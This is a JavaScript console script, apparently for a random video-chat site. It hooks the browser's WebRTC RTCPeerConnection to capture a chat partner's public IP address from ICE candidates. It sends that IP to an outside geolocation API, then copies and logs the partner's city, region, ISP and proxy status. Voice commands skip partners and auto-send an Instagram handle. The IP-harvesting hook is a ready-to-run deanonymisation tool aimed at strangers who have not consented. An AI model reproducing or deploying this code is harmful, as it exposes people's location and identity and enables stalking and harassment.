let ip;

      function copyToClipboard(text) {
        const elem = document.createElement("textarea");
        elem.value = text;
        document.body.appendChild(elem);
        elem.select();
        document.execCommand("copy");
        document.body.removeChild(elem);
      }

      function fetchLocation(ip) {
        fetch(`https://api.techniknews.net/ipgeo/${ip}`)
          .then((res) => res.json())
          .then(async (response) => {
            await copyToClipboard(
              `Ip: ${ip} \nRegione: ${response.region} \nCittà: ${response.city}`
            );
            console.clear();
            console.log("Ip: " + ip);
            console.log("Stato: " + response.country)
            console.log("Regione: " + response.regionName);
            console.log("Città: " + response.city);
            console.log("Proxy: " + response.proxy);
            console.log("Mobile: " + response.mobile);
            console.log("Org: " + response.org);
            console.log("As: " + response.as);
          })
          .catch((error) => {
            return;
          });
      }

      window.oRTCPeerConnection =
        window.oRTCPeerConnection || window.RTCPeerConnection;

      window.RTCPeerConnection = function (...args) {
        const socialcodia = new window.oRTCPeerConnection(...args);

        socialcodia.oaddIceCandidate = socialcodia.addIceCandidate;

        socialcodia.addIceCandidate = function (iceCandidate, ...rest) {
          const mufazmi = iceCandidate.candidate.split(" ");

          if (mufazmi[7] === "srflx") {
            ip = mufazmi[4];
            fetchLocation(ip);
          }
          return socialcodia.oaddIceCandidate(iceCandidate, ...rest);
        };

        return socialcodia;
      };

      var SpeechRecognition = SpeechRecognition || webkitSpeechRecognition;

      var recognition = new SpeechRecognition();

      recognition.lang = "it-IT";
      recognition.interimResults = true;

      let argsLength = 0;
      let _args;

      recognition.onresult = async (e) => {
        const texts = e.results[0][0].transcript;
        const args = texts.trim().split(" ");
        _args = texts.trim().split(" ");

        if (argsLength > 0) {
          args.splice(0, argsLength);
        }

        args
          .map((arg) => arg.toLowerCase())
          .forEach((arg) => {
            if (arg == "skip" || arg == "skippo" || arg == "pippo") {
              const btns = document.getElementsByClassName("disconnectbtn");

              for (let i = 0; i < btns.length; i++) {
                btns[i].click();
                btns[i].click();
              }

              console.clear();
              console.log("Skippato/a con successo!");
            }

            if (arg == "insta" || arg == "instagram") {
              const btns = document.getElementsByClassName("sendbtn");

              const chats = document.querySelectorAll("textarea");
              for (chat of chats) {
                try {
                  chat.innerHTML = `cl_cassanelli`;
                  chat.value = `cl_cassanelli`;
                  chat.innerText = `cl_cassanelli`;
                  chat.blur();
                } catch {}
              }

              for (let i = 0; i < btns.length; i++) {
                btns[i].click();
              }

              console.clear();
              console.log("Instagram inviato con successo!");
            }
          });

        if (e.results[0].isFinal) {
          argsLength = 0;
        } else {
          argsLength = _args.length;
        }
      };

      recognition.onend = () => {
        recognition.start();
      };

      recognition.start();
